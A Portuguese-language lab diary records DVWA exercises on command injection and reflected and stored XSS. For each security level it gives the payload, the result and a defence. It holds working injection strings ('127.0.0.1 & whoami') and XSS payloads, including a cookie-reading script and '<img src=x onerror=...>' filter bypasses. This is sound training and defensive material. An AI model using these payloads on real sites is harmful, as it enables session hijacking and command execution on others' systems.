Fechar o módulo Command Injection: submeter no nível Impossible os bypasses que funcionaram no High e confirmar que **falham**, percebendo o mecanismo da whitelist.

### Ação executada

1. DVWA Security → Impossible, módulo Command Injection.
2. **Caso de controlo:** `127.0.0.1` (só o IP) → ping normal. A whitelist aceita.
3. **Testar os bypasses do High** (e variações):
   ```
   127.0.0.1 & whoami   → ERROR: You have entered an invalid IP.
   127.0.0.1|whoami     → ERROR: You have entered an invalid IP.
   ```
   Qualquer input com caracteres para além de um IP válido devolve **sempre o mesmo erro**.

### Resultado

Todos os bypasses falharam. Só um IP válido é aceite; qualquer acréscimo de caracteres (`&`, `|`, `;`, `whoami`, com ou sem espaço) devolve invariavelmente `ERROR: You have entered an invalid IP.` — nada é executado. Módulo Command Injection fechado (Low → Medium → High → Impossible).

**Screenshots guardados:**

![screenshots/2026-08-12/entrada20-cmdinjection-impossible-ip-valido.png](screenshots/2026-08-12/entrada20-cmdinjection-impossible-ip-valido.png)

![screenshots/2026-08-12/entrada20-cmdinjection-impossible-ip-invalido-erro.png](screenshots/2026-08-12/entrada20-cmdinjection-impossible-ip-invalido-erro.png)

### Observações e interpretação

O Impossible usa uma **whitelist**: em vez de bloquear caracteres perigosos, valida que o input tem *exatamente* o formato de um IP e recusa tudo o resto. O detalhe mais revelador — e que se observou na prática — é que **todos** os bypasses dão o **mesmo** resultado (`invalid IP`), ao contrário do High, onde cada caractere dava um resultado diferente. Esse resultado uniforme é a **assinatura de uma whitelist**: a defesa não pergunta "este caractere é perigoso?" (o que deixa sempre buracos), pergunta "isto é um IP válido?" — e a resposta é não para tudo o que não seja um IP. Não há variação de sintaxe que a contorne, porque não existe uma lista de proibições para furar. É o oposto exato da fragilidade da blacklist do High.

Fecha-se assim a comparação dos quatro níveis, paralela à do SQL Injection: Low (sem defesa) → Medium/High (blacklists cada vez maiores, mas sempre furáveis) → Impossible (whitelist, a defesa correta e incontornável).

### Deduções e raciocínio (certos e corrigidos)

- **Previsão certa:** previ que o Impossible "não ia deixar passar nada". Confirmou-se.
- **Observação-chave (própria):** notei que, ao acrescentar quaisquer caracteres, o resultado era **sempre o mesmo** erro `invalid IP` — e questionei se seria um bug. Percebi que não é bug nenhum: o resultado uniforme é exatamente a prova de que a defesa é uma whitelist (rejeita tudo o que não é um IP), e não uma blacklist (que daria resultados diferentes por caractere). Boa dedução, que distingue os dois tipos de defesa pelo comportamento observável.

**Consigo explicar isto a alguém?**
  O que é uma whitelist, porque é incontornável por variação de sintaxe, e como o resultado uniforme a denuncia face a uma blacklist: **Sim** — por palavras minhas.

### Como nos podemos defender

Esta entrada **é** a demonstração da defesa correta: uma whitelist que valida o formato do input (só um IP válido) e recusa tudo o resto. É o contraste direto com as Entradas #17–#19 (Low/Medium/High), onde a ausência desta abordagem — ou o uso de blacklists — permitiu o ataque.

### Gravidade e impacto real (num cenário empresarial) — síntese para todo o módulo Command Injection (Entradas #17-20)

O Command Injection é muitas vezes considerado ainda mais grave do que a SQL Injection, porque não dá só acesso a dados — dá execução direta de comandos ao nível do sistema operativo, ou seja, controlo total do servidor, não só da base de dados. Um atacante com acesso de shell (mesmo com um utilizador de baixo privilégio, como o `www-data` que obtivemos) pode mover-se lateralmente pela rede interna, instalar mecanismos de persistência, ou implantar ransomware. Numa pequena/média empresa, o servidor comprometido é muitas vezes o único servidor que existe — pode alojar o site, mas também partilhas de ficheiros ou outros serviços internos, tornando possível uma paragem operacional total. Numa empresa grande, os servidores web costumam estar isolados numa zona desmilitarizada (DMZ), com caminhos de movimento lateral mais limitados até aos sistemas centrais — o impacto tende a ficar mais contido, mas o número elevado de aplicações expostas à internet aumenta a probabilidade de pelo menos uma delas ter esta falha nalgum ponto.

### Domínios relacionados

- **Security+ — D2 / D4:** validação de input por whitelist como controlo de codificação segura
- **CEH — D5 (Web Application Hacking):** confirmação de que uma defesa correta anula a exploração
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### O que correu mal / faltou

- **Reincidência do bug da Entrada #13:** ao pôr o nível em Impossible, o módulo Command Injection continuava a mostrar `low`. Causa: cookies `security` **duplicadas com paths diferentes** (a antiga `low` num path mais específico prevalecia sobre a nova `impossible` no path `/`). Resolvido apagando a cookie antiga via DevTools → Storage → Cookies e fazendo hard refresh (Ctrl+Shift+R) — aplicando o que já estava documentado na Entrada #13. Lição de método: o diário paga dividendos — documentado uma vez, resolvido em minutos na segunda.

### Próximos passos

- [x] Iniciar o próximo módulo do roteiro: **XSS (Reflected)** nível Low (Entrada #21, 2026-08-12)
- [ ] XSS (Reflected) níveis Medium/High/Impossible, depois Stored e DOM
- [ ] (Opcional) consolidar num quadro-resumo comparativo os módulos já fechados (SQL Injection e Command Injection)

---

## Entrada #21 — XSS Reflected (nível Low)

**Data/hora:** 2026-08-12

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante (`192.168.10.102`), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Iniciar o módulo XSS (Cross-Site Scripting), começando pela variante **Reflected** no nível Low. Perceber a mudança de paradigma: o alvo já não é o servidor (base de dados ou SO), é o **browser de outro utilizador**.

*Nota honesta: comecei este módulo sem saber praticamente nada de XSS (tinha só uma ideia vaga e errada). Fica registado como ponto de partida.*

### Ação executada

1. DVWA Security → Low. Módulo **XSS (Reflected)** — formulário "What's your name?".
2. **Caso de controlo:** `Pedro` → a página respondeu "Hello Pedro" (colou o input diretamente na página).
3. **Injeção de script:**
   ```
   <script>alert('XSS')</script>
   ```
   → apareceu um **popup** com "XSS". O browser executou o JavaScript injetado em vez de o mostrar como texto.
4. **Prova do perigo — leitura da cookie de sessão:**
   ```
   <script>alert(document.cookie)</script>
   ```
   → o popup mostrou `PHPSESSID=jvtmtpcpp9444t45ihq1cmh587; security=low`.

### Resultado

O input não foi tratado como texto, mas **executado como código** no browser. Com `document.cookie`, foi possível **ler a cookie de sessão** (`PHPSESSID`) — a chave que identifica a sessão autenticada. Num ataque real, essa cookie seria enviada em silêncio para o servidor do atacante (não um popup), permitindo *session hijacking* (assumir a identidade da vítima sem a password).

**Screenshots guardados:**

![screenshots/2026-08-12/entrada21-xss-reflected-controlo-hello.png](screenshots/2026-08-12/entrada21-xss-reflected-controlo-hello.png)

![screenshots/2026-08-12/entrada21-xss-reflected-alert.png](screenshots/2026-08-12/entrada21-xss-reflected-alert.png)

![screenshots/2026-08-12/entrada21-xss-reflected-cookie-roubada.png](screenshots/2026-08-12/entrada21-xss-reflected-cookie-roubada.png)

### Observações e interpretação

**A mudança de paradigma:** no SQLi e no Command Injection, o input escapava para uma query SQL ou um comando do SO — a vítima era o servidor. No XSS, o input escapa para o **HTML/JavaScript da página**, e o código corre no **browser de quem a abre**. A vítima é outro utilizador.

**Reflected:** o script é "refletido" de volta pelo servidor de imediato e viaja no **URL** (`?name=<script>...`). Num ataque real, o atacante coloca este URL num link e engana a vítima a clicar; o script corre na sessão dela.

**Ligação ao que já estava documentado (o diário a dar frutos):** o `document.cookie` conseguiu ler o `PHPSESSID` porque essa cookie **não tem a flag HttpOnly**. Isto já estava anunciado no próprio reconhecimento — o nmap da Entrada #8 reportava `httponly flag not set`. E o termo **HttpOnly** já estava no glossário ("impede uma cookie de ser lida por JavaScript, protegendo contra roubo de sessão via XSS") — deixou de ser teoria e passou a prática. Se a cookie tivesse HttpOnly, este ataque não a conseguiria ler.

### Deduções e raciocínio (certos e corrigidos)

- **Ponto de partida honesto:** comecei sem saber o que era XSS — tinha uma ideia vaga ("salta linhas") que estava errada. Registado de propósito.
- **Previsão certa:** ao injetar `<script>alert('XSS')</script>`, previ (com pista) que o browser executaria o código e apareceria um popup. Confirmou-se.
- **Previsão certa:** ao usar `document.cookie`, previ que apareceria a cookie de sessão. Confirmou-se — reação imediata: "estou desprotegido".
- **Compreensão nova:** percebi que a gravidade do XSS não é o popup, é o que ele *prova* — que se pode correr qualquer código no browser da vítima, incluindo roubar-lhe a sessão.

**Consigo explicar isto a alguém?**
  O que é XSS, porque é que a vítima é o utilizador e não o servidor, e como o roubo da cookie leva a *session hijacking*: **Sim** — por palavras minhas (apesar de ter começado o módulo sem saber).

### Como nos podemos defender

- **Output encoding / escaping (defesa principal):** a página deve "escapar" o input antes de o mostrar — transformar `<` em `&lt;`, `>` em `&gt;`, etc. — para o browser o exibir como *texto* em vez de o executar como código.
- **HttpOnly na cookie de sessão:** impede o JavaScript de ler o `PHPSESSID`, bloqueando o roubo de sessão via XSS (mitiga a consequência, mesmo que o XSS exista).
- **Content Security Policy (CSP):** política que restringe que scripts o browser pode executar, como camada de reforço.
- **Validação de input** onde aplicável.

### Domínios relacionados

- **Security+ — D2 (Ameaças/Vulnerabilidades):** XSS (A03/A07 do OWASP Top 10); D4 — codificação segura (output encoding)
- **CEH — D5 (Web Application Hacking):** XSS e roubo de sessão (*session hijacking*)
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### O que correu mal / faltou

- Nada falhou tecnicamente. Ponto de partida honesto documentado: comecei sem saber XSS. É suposto — é um diário de aprendizagem.
- Por fazer: níveis Medium/High/Impossible do Reflected, e as variantes **Stored** (script guardado no servidor, corre para todos os visitantes) e **DOM**.

### Próximos passos

- [x] XSS Reflected nível Medium — filtro de `<script>` contornado com `<img onerror>` (Entrada #22, 2026-08-12)
- [ ] XSS Reflected níveis High → Impossible
- [ ] XSS Stored e DOM
- [ ] (Opcional) demonstrar o roubo de cookie "a sério" (enviar para um servidor de captura no Kali), em vez do `alert`

---

## Entrada #22 — XSS Reflected (nível Medium)

**Data/hora:** 2026-08-12

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante (`192.168.10.102`), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Repetir o XSS Reflected no nível Medium para ver que defesa é introduzida e como contorná-la.

### Ação executada

1. DVWA Security → Medium. Módulo XSS (Reflected).
2. **Repetir o payload do Low:**
   ```
   <script>alert('XSS')</script>
   ```
   → **sem popup**. A página mostrou "Hello alert('XSS')" — a etiqueta `<script>` foi **apagada**, deixando só o texto `alert('XSS')` (sem etiqueta, o browser não executa).
3. **Bypass — usar JavaScript sem `<script>`:**
   ```
   <img src=x onerror=alert('XSS')>
   ```
   → **popup "XSS"**. Defesa contornada.

### Resultado

O Medium remove a string `<script>` do input (blacklist). O payload do Low deixou de funcionar, mas bastou correr JavaScript **sem** usar `<script>` para contornar: uma imagem com `src` inválido dispara o gestor de evento `onerror`, que executa o código. Nenhuma etiqueta `<script>` presente → o filtro não tem o que apagar.

**Screenshots guardados:**

![screenshots/2026-08-12/entrada22-xss-reflected-medium-script-filtrado.png](screenshots/2026-08-12/entrada22-xss-reflected-medium-script-filtrado.png)

![screenshots/2026-08-12/entrada22-xss-reflected-medium-img-bypass.png](screenshots/2026-08-12/entrada22-xss-reflected-medium-img-bypass.png)

### Observações e interpretação

O payload do bypass, peça a peça (para referência, dado que não domino programação):
- `<img ...>` — etiqueta HTML que normalmente mostra uma imagem; é uma instrução para o browser, não texto.
- `src=x` — o `src` (source) é *onde está a imagem*; `x` é um endereço falso de propósito, para a imagem **falhar** a carregar.
- `onerror=...` — *event handler* ("quando der erro"): "se algo correr mal a carregar a imagem, faz o seguinte".
- `alert('XSS')` — o código que corre quando o erro acontece (o popup).

A lição central: **`<script>` não é a única forma de executar JavaScript.** Vários gestores de evento (`onerror`, `onclick`, `onmouseover`, `onload`...) disparam código a partir de outras etiquetas. Por isso, bloquear só `<script>` (blacklist) nunca cobre todas as formas — é a mesma fraqueza do Command Injection Medium, agora no mundo do HTML/JavaScript. O payload `<img onerror>` é uma "chave-mestra": funciona no Low (sem filtro) **e** no Medium (que só sabe apagar `<script>`).

### Deduções e raciocínio (certos e corrigidos)

- **Previsão certa:** previ que o Medium "ia subir a defesa mas não o suficiente para bloquear" (assinatura de uma blacklist). Confirmou-se — bloqueou o `<script>` mas não o `<img onerror>`.
- **Compreensão nova:** percebi que o *resultado* (popup) é o mesmo do Low, mas o *caminho* é diferente (janela lateral em vez da porta da frente), e que o payload `<img onerror>` também funcionaria no Low, porque lá não há filtro nenhum.
- **Nota de método pessoal:** não sei programar, e tenho dificuldade em criar/entender payloads. Ficou registada a decomposição peça a peça do `<img onerror>` para consulta futura — o objetivo é *perceber o que o payload faz*, não decorá-lo.

**Consigo explicar isto a alguém?**
  Que a defesa do Medium apaga `<script>`, e que se contorna porque há outras formas de correr JavaScript (event handlers como `onerror`): **Sim** — por palavras minhas.

### Como nos podemos defender

- **Output encoding / escaping (defesa principal):** escapar o input (`<` → `&lt;`, etc.) para o browser o mostrar como texto, em vez de tentar apagar etiquetas específicas. Uma blacklist de etiquetas (como a do Medium) está condenada a falhar, porque há inúmeras formas de correr JavaScript.
- **Content Security Policy (CSP)** como reforço.

### Domínios relacionados

- **Security+ — D2 / D4:** XSS; codificação segura (output encoding); evasão de blacklist
- **CEH — D5 (Web Application Hacking):** bypass de filtros de XSS por etiquetas/eventos alternativos
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### O que correu mal / faltou

- Nada falhou. Nota honesta: como não programo, a criação e leitura dos payloads é a minha maior dificuldade — mitigada com a decomposição peça a peça, registada na entrada.
- Por fazer: níveis High e Impossible do Reflected, e as variantes Stored e DOM.

### Próximos passos

- [x] XSS Reflected nível High — `<img onerror>` ainda passa; `<script>` bloqueado em qualquer forma (Entrada #23, 2026-08-12)
- [ ] XSS Reflected Impossible (a defesa correta — output encoding)

---

## Entrada #23 — XSS Reflected (nível High)

**Data/hora:** 2026-08-12

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante (`192.168.10.102`), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Repetir o XSS Reflected no nível High para ver que filtragem mais apertada é usada e se ainda se contorna.

### Ação executada

1. DVWA Security → High. Módulo XSS (Reflected).
2. **Bypass do Medium (`<img onerror>`):**
   ```
   <img src=x onerror=alert('XSS')>
   ```
   → **popup "XSS"**. Ainda passa.
3. **Variação de `<script>` (Caminho A, que passaria no Medium):**
   ```
   <ScRiPt>alert('XSS')</ScRiPt>
   ```
   → **bloqueado**. Sem popup; a página mostra só "Hello >" (o filtro apagou a parte do "script").

### Resultado

O `<img onerror>` continua a funcionar (bypass), mas a variação de maiúsculas de `<script>` deixou de funcionar. O High melhorou o filtro do "script" mas continua cego a tudo o que não seja "script".

**Screenshots guardados:**

![screenshots/2026-08-12/entrada23-xss-reflected-high-img-bypass.png](screenshots/2026-08-12/entrada23-xss-reflected-high-img-bypass.png)

![screenshots/2026-08-12/entrada23-xss-reflected-high-script-bloqueado.png](screenshots/2026-08-12/entrada23-xss-reflected-high-script-bloqueado.png)

### Observações e interpretação

**O que o High melhorou:** no Medium, o filtro apagava apenas o `<script>` exato (minúsculas), pelo que uma variação como `<ScRiPt>` passaria. No High, o filtro apanha "script" em **qualquer combinação de maiúsculas/minúsculas** (e até com caracteres pelo meio) — fechou a variação de `<script>` (Caminho A).

**O que o High NÃO mudou:** continua a pensar apenas na palavra "script". Nunca considerou que o XSS **não precisa de `<script>`**. Por isso etiquetas alternativas com event handlers — `<img onerror>`, `<svg onload>`, `<body onload>` — passam-lhe ao lado (Caminho B).

O padrão é o mesmo dos outros módulos: o programador **tapou o buraco específico que conhecia** (variações de `<script>`), mas mantém uma **blacklist** — bloquear coisas-más-conhecidas — o que deixa a porta aberta a tudo o que não pensou. O `<img onerror>` é uma **chave-mestra**: funciona no Low, Medium **e** High. Para um atacante que saiba que o XSS vive de event handlers e não só de `<script>`, o High quase não é mais difícil que o Medium.

### Deduções e raciocínio (certos e corrigidos)

- **Previsão certa:** previ que o `<img onerror>` ainda passaria no High (por continuar a ser blacklist). Confirmou-se.
- **Demonstração dupla:** testei os dois caminhos e vi ao vivo que o High fechou o Caminho A (`<ScRiPt>` bloqueado) mas deixou o Caminho B (`<img onerror>` a passar) — a prova concreta de que a melhoria foi parcial e específica.

**Consigo explicar isto a alguém?**
  Que o High bloqueia "script" em qualquer forma mas não outras etiquetas/eventos, e porque é que isso mantém o XSS possível: **Sim** — por palavras minhas.

### Como nos podemos defender

- **Output encoding / escaping (defesa principal):** escapar o input para o browser o mostrar como texto, em vez de tentar apagar etiquetas específicas — que é uma corrida perdida, pois há inúmeras formas de correr JavaScript.
- **Content Security Policy (CSP)** como reforço.
- É o que o nível **Impossible** implementa — a comparar a seguir.

### Domínios relacionados

- **Security+ — D2 / D4:** XSS; codificação segura; evasão de blacklist
- **CEH — D5 (Web Application Hacking):** bypass de filtros de XSS por etiquetas/eventos alternativos
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### O que correu mal / faltou

- Nada falhou. Por fazer: o nível **Impossible** do Reflected, e depois as variantes **Stored** e **DOM**.

### Próximos passos

- [x] XSS Reflected Impossible — output encoding mostra o payload como texto, sem executar (Entrada #24, 2026-08-12)
- [ ] XSS Stored e DOM

---

## Entrada #24 — XSS Reflected (nível Impossible)

**Data/hora:** 2026-08-12

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante (`192.168.10.102`), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Fechar o XSS Reflected: submeter no nível Impossible a "chave-mestra" que funcionou do Low ao High e confirmar que **falha**, percebendo o mecanismo do output encoding.

### Ação executada

1. DVWA Security → Impossible. Módulo XSS (Reflected).
2. **Testar a chave-mestra do Low/Medium/High:**
   ```
   <img src=x onerror=alert('XSS')>
   ```
   → **sem popup**. A página mostrou o payload como **texto literal**: "Hello \<img src=x onerror=alert('XSS')\>".

### Resultado

O payload não foi executado — foi **mostrado como texto**, inteiro e visível, tal como escrito. Ao contrário do Medium/High (que *apagavam* partes do input), aqui nada foi removido: o texto está todo lá, mas inofensivo. Módulo XSS Reflected fechado (Low → Impossible).

**Screenshot guardado:**

![screenshots/2026-08-12/entrada24-xss-reflected-impossible-payload-texto.png](screenshots/2026-08-12/entrada24-xss-reflected-impossible-payload-texto.png)

### Observações e interpretação

O Impossible usa **output encoding / escaping**: antes de mostrar o input, transforma os caracteres especiais — `<` vira `&lt;`, `>` vira `&gt;`. O browser recebe esses códigos e apresenta-os como as letras "<" e ">", em vez de os interpretar como uma etiqueta HTML. O payload continua todo presente, mas perdeu o poder de ser código.

A diferença face à blacklist (Medium/High) é reveladora: a blacklist **apaga/mutila** o que julga perigoso (e falha, porque não consegue prever tudo); o output encoding **mantém tudo** mas neutraliza-o. E é por isso que é incontornável: não tenta adivinhar o que é perigoso — trata **todo** o input como texto por defeito. Não interessa que etiqueta ou evento se invente (`<img>`, `<svg>`, ou algo novo), tudo é mostrado como texto. Não há buraco para encontrar, porque não há lista de proibições — há uma regra universal.

Fecha-se o padrão dos três Impossible já feitos, que são todos a mesma ideia — **separar dado de código** (o "fio condutor" do guia comparativo):
- **SQLi Impossible:** prepared statements — o input nunca vira SQL
- **Command Injection Impossible:** whitelist — só o formato válido é aceite
- **XSS Impossible:** output encoding — o input é mostrado como texto, nunca executado

### Deduções e raciocínio (certos e corrigidos)

- **Previsão certa:** previ que o Impossible ia "mostrar o payload como o escrevi" (texto), em vez de o executar. Confirmou-se.
- **Distinção compreendida:** percebi que o output encoding **não apaga** nada (o payload aparece inteiro), ao contrário do filtro do Medium/High — e que é essa a diferença entre a defesa correta e a blacklist.

**Consigo explicar isto a alguém?**
  O que é output encoding, porque é que mostra o payload como texto sem o executar, e porque é a defesa universal contra XSS (face à blacklist): **Sim** — por palavras minhas.

### Como nos podemos defender

Esta entrada **é** a demonstração da defesa correta: output encoding/escaping de todo o output que inclua input do utilizador. Reforço com HttpOnly (contra roubo de cookie, ver Entrada #21) e CSP. É o contraste direto com as Entradas #21–#23 (Low/Medium/High), onde a ausência de encoding — ou o uso de blacklists — permitiu o ataque.

### Gravidade e impacto real (num cenário empresarial) — síntese para o módulo XSS Reflected (Entradas #21-24)

Este tipo de XSS exige que o atacante consiga atrair uma vítima específica a clicar numa hiperligação preparada — é um ataque dirigido, vítima a vítima, não automático. Permite sequestro de sessão (personificar o utilizador autenticado, tal como confirmámos ao ler a cookie de sessão real), páginas de phishing injetadas dentro de um domínio de confiança, ou entrega de malware. Numa pequena/média empresa, o alvo mais provável é a própria conta de administração do negócio — um único clique num email de phishing bem construído pode comprometer o painel de administração do único site que a empresa tem. Numa empresa grande, é mais difícil visar um funcionário privilegiado específico entre milhares, mas se a aplicação vulnerável for voltada para o cliente (por exemplo, o portal de um banco), o atacante pode lançar campanhas de phishing em larga escala contra toda a base de clientes — dano individualmente mais pequeno, mas espalhado por muitas vítimas.

### Domínios relacionados

- **Security+ — D2 / D4:** XSS; output encoding como controlo de codificação segura
- **CEH — D5 (Web Application Hacking):** confirmação de que a defesa correta anula a exploração
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### O que correu mal / faltou

- Nada falhou — correu limpo. Fecha o XSS Reflected completo.
- Por fazer: as variantes **Stored** (script guardado no servidor, corre para todos os visitantes) e **DOM**.

### Próximos passos

- [x] XSS **Stored** nível Low — payload guardado no livro de visitas, dispara a cada visita (Entrada #25, 2026-08-15)
- [ ] XSS Stored níveis Medium → Impossible
- [ ] XSS **DOM**
- [ ] (Opcional) atualizar o guia comparativo com uma linha sobre as variantes de XSS

---

## Entrada #25 — XSS Stored (nível Low)

**Data/hora:** 2026-08-15

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante (`192.168.10.x`, após renovação DHCP — ver "O que correu mal"), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Explorar a variante **Stored** do XSS no nível Low e perceber a diferença fundamental face ao Reflected: o payload deixa de ser passageiro (no URL) e passa a ficar **guardado no servidor**, disparando para todos os visitantes.

### Ação executada

1. DVWA Security → Low. Módulo **XSS (Stored)** — um **livro de visitas** (Guestbook) com campos **Name** e **Message**, e a lista de mensagens já submetidas por baixo.
2. **Caso de controlo:** já existia uma mensagem normal ("test / This is a test comment"), que serve de referência do comportamento normal (mensagem guardada e mostrada).
3. **Injeção**, no campo **Message**:
   ```
   <script>alert('XSS')</script>
   ```
   (Name: `pedro`.) Submetido com "Sign Guestbook".
4. **Prova de persistência:** saída e regresso à página **pelo menu lateral** (carregamento limpo, via GET — não por F5, que faria reenvio do formulário / "Resend").

### Resultado

Após submeter, a nova entrada apareceu na lista com o **Message vazio** — sinal de que o `<script>` foi **guardado como código** (não como texto; se estivesse escapado, ver-se-ia o texto do payload). Ao **revisitar a página pelo menu** (carregamento limpo, sem reenviar nada), o **popup "XSS" disparou sozinho**. Isto confirma o essencial do Stored: o payload está guardado no servidor e executa **a cada visita, para qualquer utilizador**.

**Screenshots:** *(capturados durante o exercício — o payload guardado no livro de visitas e o popup a disparar numa revisita limpa. A inserir na próxima sessão; o ambiente de recorte esteve indisponível nesta.)*

### Observações e interpretação

**Porque é que a janela do Stored é diferente da do Reflected (Name + Message vs um só campo):** a interface de cada tipo de XSS imita o **cenário real** onde esse ataque acontece.
- O **Reflected** ("What's your name?", um só campo) imita sítios onde o input é **devolvido de imediato** e não é guardado — caixas de pesquisa, páginas de erro, parâmetros no URL. Um campo, eco imediato, uma vítima (a que se engana a clicar no link).
- O **Stored** (livro de visitas, Name + Message) imita sítios onde o input é **guardado** e mostrado a **outras pessoas** — comentários, fóruns, avaliações, perfis, livros de visitas. Por isso a página tem estrutura de "guardar e mostrar" (formulário **+** lista das mensagens anteriores), que a do Reflected não tem. A diferença de aspeto **é** a lição: mostra a diferente superfície de ataque.
- Nota lateral: o livro de visitas tem **dois** campos (Name e Message), ambos potenciais pontos de injeção, e com limites/proteções que podem diferir (o Name costuma ser mais curto).

**Gravidade face ao Reflected:** no Reflected é preciso enganar **cada** vítima, uma a uma, a clicar num link. No Stored injeta-se **uma vez** e a armadilha fica montada — **todos** os que visitarem a página são atingidos, automaticamente, sem mais esforço do atacante. É o mais perigoso dos três XSS.

### Deduções e raciocínio (certos e corrigidos)

- **Previsão certa:** previ que, em Stored, o payload afetaria **todos** os visitantes (não só eu). Confirmou-se.
- **Afinação:** percebi que o "afeta todos" não é por ser nível Low — é a **natureza do Stored** (ficar guardado). O nível só muda a filtragem.
- **Leitura correta do resultado:** interpretei o Message **vazio** na lista como sinal de sucesso (script guardado como código, invisível), e não como falha.
- **Callback à Entrada #13:** o aviso "Resend" do Firefox voltou a aparecer ao fazer F5; sabendo da #13, evitei o reenvio e testei a persistência pelo menu (GET limpo) — a forma correta.

**Consigo explicar isto a alguém?**
  A diferença entre Stored e Reflected (onde fica o payload, quem dispara e quantas vezes), e porque é que o Stored é o mais perigoso: **Sim** — por palavras minhas.

### Como nos podemos defender

- **Output encoding no momento de mostrar** o conteúdo guardado: ao apresentar as mensagens do livro de visitas, escapar `<`, `>`, etc., para o browser as mostrar como texto em vez de as executar. (No Stored, o encoding tem de ser feito **na saída**, quando se mostra o conteúdo guardado a cada visitante.)
- **Validação/sanitização do input na entrada** como reforço.
- **Content Security Policy (CSP)** para limitar execução de scripts.
- **HttpOnly** na cookie de sessão, para mitigar o roubo de sessão caso um XSS passe.

### Domínios relacionados

- **Security+ — D2 / D4:** XSS persistente (Stored); output encoding
- **CEH — D5 (Web Application Hacking):** Stored XSS, o de maior impacto por atingir múltiplas vítimas
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### O que correu mal / faltou

- **Reversão de rede do Kali (recorrente):** após reinício, o `eth0` voltou à rede de casa (`192.168.1.50`) em vez do segmento Ciber. Resolvido com `sudo dhclient -r eth0 && sudo dhclient eth0`.
- **VMware não abria após atualização do kernel:** o sistema atualizou para o kernel `6.8.0-137` e o VMware recusou-se a carregar os módulos (a janela "Install" falha sempre). Resolvido arrancando no kernel anterior (`6.8.0-124`) via `grub-reboot` pelo terminal. Lição de sistema: kernels novos partem frequentemente o VMware; manter um kernel funcional como alternativa. (Cura definitiva — atualizar o VMware ou fixar o kernel — a fazer noutra sessão.)
- **Incidente de organização:** pastas locais duplicadas/perdidas causaram confusão; recuperado do GitHub (clone) e consolidado numa só pasta em `~/Desktop/lab-ciberseguranca`. Reforça a lição: o trabalho vive no GitHub; a pasta local é descartável.

### Próximos passos

- [ ] XSS Stored níveis Medium → Impossible
- [ ] XSS DOM
- [ ] (Opcional) atualizar o guia comparativo com uma nota sobre as três variantes de XSS (Reflected/Stored/DOM)

---

## Entrada #26 — XSS Stored (nível Medium)

**Data/hora:** 2026-08-15

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar o XSS Stored contra a defesa de nível Medium e confirmar se é a mesma blacklist já vista no Reflected Medium (bloqueia a string `<script>`), incluindo o mesmo bypass com atributo de evento HTML.

### Ação executada

1. DVWA Security → Medium. Módulo **XSS (Stored)**.
2. **Caso de controlo:** entradas já existentes no livro de visitas ("test", "pedro") serviram de referência do comportamento normal.
3. **Injeção 1 — payload do Low**, no campo Message:
   ```
   <script>alert('XSS')</script>
   ```
   (Name: `teste`.) Submetido com "Sign Guestbook".
4. **Verificação:** ao reler a lista após o submit, apareceu um popup — mas com o formulário ainda preenchido, **antes** de clicar em "Sign Guestbook". Identificado como efeito secundário do contador de caracteres em JavaScript do campo Message (reflete o valor no DOM enquanto se escreve, do lado do cliente, independente do filtro do servidor). Distinguido do teste real: clicado OK, depois "Sign Guestbook", e conferida a lista após reload limpo.
5. **Resultado do payload do Low:** a entrada ficou registada como `Message: alert('XSS')` — as tags `<script>` e `</script>` foram removidas pela blacklist, sobrando só texto solto, sem executar. Sem popup ao carregar a página.
6. **Injeção 2 — bypass**, no campo Message:
   ```
   <img src=x onerror=alert('XSS')>
   ```
   (Name: `teste`.) Submetido com "Sign Guestbook".
7. **Prova de persistência:** confirmado que, ao recarregar a página (via link do menu, e também via F5 com "Resend"), o popup "XSS" dispara sempre.

### Resultado

A blacklist do Medium apaga apenas a string literal `<script>`. O payload do Low foi neutralizado (viraram texto solto). O bypass com `<img src=x onerror=alert('XSS')>` não contém essa string — explora o atributo de evento `onerror` (dispara quando a imagem falha a carregar) — e passou incólume, ficando guardado e a disparar em **todas** as visitas à página. Mesmo padrão do XSS Reflected Medium.

### Deduções e raciocínio (certos e corrigidos)

- **Previsão certa:** antes de testar, previ que o comportamento seria "o normal" (a mesma blacklist do Reflected Medium). Confirmou-se: blacklist a apanhar só `<script>`, bypass com `onerror`.
- **Correção importante:** o primeiro popup que vi (com o formulário ainda preenchido) não era o resultado do filtro do servidor — era o contador de caracteres em JavaScript do campo Message, que reflete o input no DOM em tempo real, do lado do cliente. Aprendi a distinguir esse efeito do teste real (que só se confirma depois de guardar e recarregar a página de forma limpa).
- **Reforço de conceito:** confirmei por palavras próprias porque a blacklist falha — vigia uma palavra específica (`<script>`), não o conceito de "código perigoso". O `onerror` é um mecanismo do HTML (atributo de evento) que dispara JavaScript sem precisar da tag `<script>`, por isso escapa ao filtro.

**Consigo explicar isto a alguém?**
  Porque é que uma blacklist que bloqueia `<script>` não impede `<img onerror>`: **Sim** — usando a analogia do segurança que só vigia uma palavra ("bomba") e deixa passar quem entra disfarçado de outra forma.

### Como nos podemos defender

